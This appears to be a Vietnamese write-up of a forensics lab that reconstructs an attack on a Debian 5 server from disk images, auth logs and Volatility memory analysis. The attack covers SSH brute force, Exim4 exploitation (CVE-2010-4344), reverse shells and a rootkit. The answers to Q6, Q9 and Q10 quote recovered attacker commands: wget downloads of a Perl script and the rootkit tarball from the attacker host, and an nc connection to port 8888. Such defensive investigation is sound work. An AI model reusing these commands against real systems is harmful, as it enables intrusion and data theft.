# Ulysses Lab

## 1. Bối cảnh 

Bài Lab mô phỏng một sự cố trên máy chủ Linux phục vụ nghiên cứu. Máy chủ bị gắn cờ vì hoạt động đáng ngờ sau nhiều lần xác thực thất bại. Các nhà phân tích phát hiện dấu hiệu của một cuộc tấn công brute-force, các kết nối đi ra trái phép và những cơ chế persistence khả nghi. Một profile Volatility tùy chỉnh (Debian5_26) được cung cấp để phân tích bản memory dump của hệ thống bị xâm nhập.

Nhiệm vụ của mình là đóng vai chuyên viên điều tra: phân tích memory dump và log bằng Volatility và FTK Imager để dựng lại cuộc tấn công, xác định điểm xâm nhập của kẻ tấn công, tìm các tiến trình độc hại và các payload đã được triển khai, từ đó thu thập các IOCs. Công cụ sử dụng trong bài: Volatility 2 (profile Debian5_26), 010 Editor, Autopsy, FTK Imager, VsCode.


## 2. Điều tra

### Q1: The attacker was performing a Brute Force attack. What account triggered the alert?

- Ở câu này mình sẽ sử dụng FTK Imager mở tệp ảnh phân vùng đĩa `victoria-v8.sda1.img`, điều hướng tới thư mục `/var/log/` và trích xuất tệp nhật ký xác thực `auth.log`.

<img width="1917" height="1017" alt="image" src="https://github.com/user-attachments/assets/f30fdf99-1e7c-49a7-81c0-51e207a0cc42" />

- Sau đó mình lọc các sự kiện xác thực thất bại bằng PowerShell (`Select-String -Path .\auth.log -Pattern "Failed password|authentication failure|Invalid user"`), kết quả phát hiện từ thời điểm `Feb 6 15:16:20` xuất hiện chuỗi tấn công dò mật khẩu (brute-force) qua SSH từ IP `192.168.56.1` nhắm liên tục vào tài khoản `ulysses` (`Invalid user ulysses from 192.168.56.1`).

<img width="1917" height="906" alt="image" src="https://github.com/user-attachments/assets/b94aec5a-e772-4df7-a4f3-c0b3c12635e4" />

### Q2: During investigating the logs. How many failed login attempts were alerted by the same user?

- Từ tệp nhật ký xác thực `auth.log` đã trích xuất tại đường dẫn `/var/log/auth.log`, mình sử dụng PowerShell lọc và đếm trực tiếp tổng số bản ghi xác thực thất bại liên quan tới tài khoản `ulysses` bằng lệnh `(Get-Content .\auth.log | Select-String -Pattern "Failed.*ulysses").Count`.

<img width="1601" height="108" alt="image" src="https://github.com/user-attachments/assets/d4e1e3d6-e859-4415-ba77-d40d04c18972" />

- Kết quả cho ra có tổng cộng `32` lần đăng nhập thất bại được ghi nhận.


### Q3: What kind of system runs on the targeted server?

- Ở câu này mình vẫn sẽ sử dụng FTK Imager , điều hướng tới thư mục `/etc/` và đọc nội dung tệp banner hệ thống `/etc/issue`, ghi nhận chuỗi định danh `Debian GNU/Linux 5.0` (đối chiếu thêm `/etc/debian_version` xác nhận phiên bản `5.0.7`).

<img width="1917" height="957" alt="image" src="https://github.com/user-attachments/assets/b90a1bd1-e2cb-414a-aa4c-caf0b2637287" />

### Q4: What is the victim's IP address?

- Mình sử dụng plugin `linux_netstat: .\volatility_2.6_win64_standalone.exe --plugins=. -f .\victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat` để kiểm tra bảng kết nối mạng đang hoạt động.

<img width="1915" height="627" alt="image" src="https://github.com/user-attachments/assets/4d9a5946-ef23-48e9-b298-177a696adbab" />

- Kết quả cho thấy cột địa chỉ nội bộ (Local Address) của các phiên kết nối TCP (`ESTABLISHED` tới `192.168.56.1:4444`, `192.168.56.1:8888` và `CLOSE` tại cổng `25`), xác định địa chỉ IP của máy chủ nạn nhân là `192.168.56.102`.

### Q5: What are the attacker's two IP addresses?

- Từ kết quả của Q4 mình cũng xác định hai địa chỉ IP của kẻ tấn công:

  -  `192.168.56.101`: Kết nối tới cổng `25` (SMTP/Exim4) của máy nạn nhân (`192.168.56.102:25 -> 192.168.56.101:37202`, trạng thái `CLOSE`) gắn với tiến trình shell `sh/2065`, đóng vai trò khai thác lỗ hổng xâm nhập ban đầu.
  -  `192.168.56.1`: Duy trì hai phiên kết nối reverse shell (`ESTABLISHED`) qua cổng `4444` (`sh/2065`) và cổng `8888` (`nc/2169`), đồng thời là nguồn phát động tấn công Brute Force SSH vào tài khoản `ulysses` ghi nhận trong `/var/log/auth.log`.
 
### Q6: What is the nc service PID number that was running on the server?

- Từ kết quả trích xuất bảng kết nối mạng `linux_netstat` mình ghi nhận phiên kết nối reverse shell `ESTABLISHED` tới `192.168.56.1:8888` gắn với tiến trình `nc/2169`.
- Sau đó mình hạy plugin `linux_psaux:.\volatility_2.6_win64_standalone.exe --plugins=. -f .\victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_psaux | Select-String "nc"` để kiểm tra chi tiết tiến trình, thu được bản ghi `2169   0      0      nc 192.168.56.1 8888`. Kết quả khẳng định tiến trình `nc` đang chạy dưới quyền `root` (UID `0`) với mã PID là `2169`.

<img width="1891" height="126" alt="image" src="https://github.com/user-attachments/assets/fbf03234-586e-4676-a73c-15be10a1edb2" />

### Q7: What service was exploited to gain access to the system?

- Mình đối chiếu bảng kết nối mạng `linux_netstat` với cây tiến trình `linux_pstree:.\volatility_2.6_win64_standalone.exe --plugins=. -f .\victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_pstree`.

<img width="1900" height="817" alt="image" src="https://github.com/user-attachments/assets/39703b4a-f10e-49f7-aea0-a0b64d937c5c" />

- Kết quả ghi nhận dịch vụ `exim4` (PID `1942`, UID `101`) đang lắng nghe trên cổng `25`, và tiến trình shell `sh` (PID `2065` — gắn với phiên kết nối từ `192.168.56.101:37202` vào cổng `25` và kết nối reverse shell tới `192.168.56.1:4444`) đã được sinh ra từ dịch vụ này trước khi chuyển về trực thuộc `init` (PID `1`).

### Q8: What is the CVE number of exploited vulnerability?

- Từ kết quả Q7 mình xác định dịch vụ bị khai thác là `exim4`, sau đó mình mở tệp ảnh phân vùng `victoria-v8.sda1.img` bằng FTK Imager, kiểm tra thư mục lưu trữ gói cài đặt `/var/cache/apt/archives/` xác định máy chủ đang chạy `exim4` phiên bản `4.69-9`.

<img width="1917" height="1020" alt="image" src="https://github.com/user-attachments/assets/ca54e431-5301-4aac-8469-263a62a7545f" />

- Sau đó mình phân tích nhật ký khai thác tại `/var/log/exim4/rejectlog` ghi nhận vào lúc `2011-02-06 15:07:13`, máy kẻ tấn công `192.168.56.101` (`H=(abcde.com)`) đã gửi một gói tin SMTP vượt giới hạn kích thước cho phép (`message too big: read=52724820 max=52428800`) kèm hàng loạt tiêu đề giả nhồi chuỗi đệm dài (`Header0000: VVV...` với tổng 201.968 ký tự).

<img width="1680" height="890" alt="image" src="https://github.com/user-attachments/assets/94c3815c-fbe3-48a6-b648-615a2c1c6cdc" />

- Đối chiếu mã lỗ hổng (CVE): Kỹ thuật nhồi tiêu đề SMTP kích thước lớn nhằm ép dịch vụ ghi nhật ký từ chối thư là đặc trưng của lỗi tràn bộ đệm vùng nhớ heap (Heap-based Buffer Overflow) trong hàm xử lý chuỗi `string_format` trên Exim phiên bản trước 4.70 (Exim 4.69), cho phép thực thi lệnh từ xa (RCE) và sinh ra tiến trình shell `sh` (PID `2065`). MÌnh xác định mã lỗ hổng là `CVE-2010-4344`.

### Q9: During this attack, the attacker downloaded two files to the server. Provide the name of the compressed file.

- Mình tiến hanh xuất và kiểm tra nội dung tệp nhật ký `/var/log/exim4/rejectlog`. Sau đó mình tìm kiếm từ khóa `wget` trong phần payload thực thi lệnh từ xa của kẻ tấn công, ghi nhận hai tệp được tải về thư mục `/tmp/` từ máy chủ `192.168.56.1`: tệp script Perl `c.pl` (`wget http://192.168.56.1/c.pl -O /tmp/c.pl`) và tệp nén lưu trữ **`rk.tar`** (`wget http://192.168.56.1/rk.tar -O /tmp/rk.tar`).

<img width="1907" height="800" alt="image" src="https://github.com/user-attachments/assets/c784072d-104f-4266-8e78-0742af43940d" />

### Q10: During the investigation, two ports were involved in the process of data exfiltration. Which port did the nc command used for the exfiltration?

- Từ kết quả `linux_netstat` mình ghi nhận được hai cổng kết nối `ESTABLISHED` tới địa chỉ `192.168.56.1` là cổng `4444` (`sh/2065`) và cổng `8888` (`nc/2169`).

- Sau đó mình kiểm tra chi tiết tham số thực thi của tiến trình `nc` bằng plugin `linux_psaux`: `.\volatility_2.6_win64_standalone.exe --plugins=. -f .\victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_psaux | Select-String "nc"`, thu được bản ghi `2169   0      0      nc 192.168.56.1 8888`.

<img width="1912" height="222" alt="image" src="https://github.com/user-attachments/assets/820a28c4-141d-4c50-9494-64de6e40ce72" />

### Q11: Which port did the attacker try to block on the firewall?

- Từ kết quả Q9,mình điều hướng tới thư mục `/tmp` và xuất tệp nén `rk.tar` ra máy phân tích.

- Giải nén tệp lưu trữ mình thu được thư mục `rk/` chứa bộ công cụ rootkit gồm các tệp thực thi (`dropbear`, `mig`), thư mục `procps/` và hai tệp kịch bản cài đặt (`install.sh`, `vars.sh`).

<img width="520" height="160" alt="image" src="https://github.com/user-attachments/assets/299aa96b-f0de-42eb-acc3-83560b352159" />

- Sau đó mình rà soát quy tắc tường lửa trong các tệp kịch bản bằng lệnh `Select-String -Path .\rk\*.sh -Pattern "iptables"` thì ghi nhận câu lệnh `iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP` ở dòng 71.

<img width="835" height="147" alt="image" src="https://github.com/user-attachments/assets/fb4dea92-22de-4b36-b594-a7cb82895908" />
